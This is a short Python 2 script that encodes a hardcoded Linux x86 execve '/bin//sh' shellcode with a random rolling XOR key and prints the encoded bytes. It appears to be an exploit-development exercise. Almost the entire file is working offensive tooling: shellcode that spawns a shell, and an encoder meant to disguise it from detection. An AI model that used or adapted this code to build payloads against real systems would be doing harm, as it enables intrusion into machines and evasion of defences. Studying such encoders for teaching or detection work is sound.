# Filename: custom_xor_encoder.py
# Futhor: wfscs3
# Description: Rolling XOR shellcode encoder. 

import random

#execve-stack shellcode
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

#Generate random int
key = random.randint(1,255)
keyhex = hex(key)

#Create array and append random int.
code = [key]


print "\n[*] XOR key: ",keyhex, '({})'.format(key)

#Encode every byte in shellcode with result of previous.
for s in shellcode:  
    code += [ord(s) ^ code[-1]]

#print shellcode length and encoded shellcode
print '[*] Shellcode Length: %d' % (len(bytearray(code))-1)
print(", ".join(hex(c) for c in code[1::]))  